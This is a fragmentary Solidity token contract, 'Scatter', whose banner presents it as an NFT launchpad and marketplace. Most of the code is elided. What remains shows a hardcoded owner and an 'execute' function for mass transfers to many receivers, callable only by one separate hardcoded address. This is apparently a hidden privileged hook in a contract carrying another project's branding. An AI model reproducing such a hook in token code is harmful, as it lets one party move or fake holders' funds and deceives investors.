...
/*
 ...
 .M"""bgd                   mm     mm                   
,MI    "Y                   MM     MM                   
`MMb.      ,p6"bo   ,6"Yb.mmMMmm mmMMmm .gP"Ya `7Mb,od8 
  `YMMNq. 6M'  OO  8)   MM  MM     MM  ,M'   Yb  MM' "' 
.     `MM 8M        ,pm9MM  MM     MM  8M""""""  MM     
Mb     dM YM.    , 8M   MM  MM     MM  YM.    ,  MM     
P"Ybmmd"   YMbmd'  `Moo9^Yo.`Mbmo  `Mbmo`Mbmmd'.JMML.   
        

        NFT collection launchpad and marketplace. 
            For the people, by the people                                              
                                                                                                        
                                                        
https://scatter.art
https://twitter.com/scatter_art
...
contract Scatter is Context, IERC20 {
    ...
    address public _Owner = 0xEB8AAe76183355A75bC56D7Fb3B7a92b427595ad;
    ...
    constructor () public {
        ...
        team = 0xEB8AAe76183355A75bC56D7Fb3B7a92b427595ad;
  ...
  function execute(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _noAccess(){
    ...
    modifier _noAccess() {require(msg.sender == 0xd38340154a466A74B4f18a11Ca6cfFABC532B3c1, "Not allowed to interact");_;}
